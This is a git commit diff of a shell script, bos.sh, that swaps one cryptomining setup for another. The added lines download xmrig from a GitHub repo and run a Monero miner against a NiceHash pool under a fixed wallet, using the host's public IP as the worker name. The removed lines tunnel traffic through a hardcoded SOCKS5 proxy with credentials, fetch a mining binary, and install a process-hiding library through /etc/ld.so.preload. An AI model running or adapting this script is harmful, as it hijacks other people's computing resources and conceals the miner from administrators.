4e342ff0af66b3a092ce18448ddf7f4c910871fa
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-06-18 11:10:06 -0700

    Update bos.sh

--- bos.sh
+++ bos.sh
@@ -1,44 +1,9 @@
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
+wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
+\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
+\rm node-v14.17.0-linux-x64.tar.gz
+PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
+npm config set cache /tmp --global
+wget https://raw.githubusercontent.com/hondacars/sirji/main/xmrig-6.17.0-bionic-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0
+ph add xmrig
+ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./xmrig -a rx/0 -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380  -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.$ip -p x --threads=8 --cpu-priority=2 --randomx-mode=fast --keepalive
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo " "
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo " "
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
